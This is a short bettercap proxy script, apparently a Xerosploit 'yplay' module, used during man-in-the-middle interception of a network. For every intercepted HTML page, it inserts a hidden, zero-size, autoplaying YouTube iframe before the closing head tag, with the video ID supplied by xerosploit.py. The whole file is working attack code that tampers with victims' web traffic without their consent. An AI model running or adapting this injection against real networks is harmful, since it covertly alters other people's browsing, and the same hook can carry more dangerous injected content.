// Xerosploit yplay template for bettercap v2 (http.proxy.script).
// __VIDEO_ID__ is replaced by xerosploit.py with the YouTube video ID.
function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ){
      res.Body = body.replace('</head>', '<iframe width="0" height="0" src="http://www.youtube.com/embed/__VIDEO_ID__?autoplay=1" frameborder="0" allowfullscreen></iframe></head>');
    }
  }
}
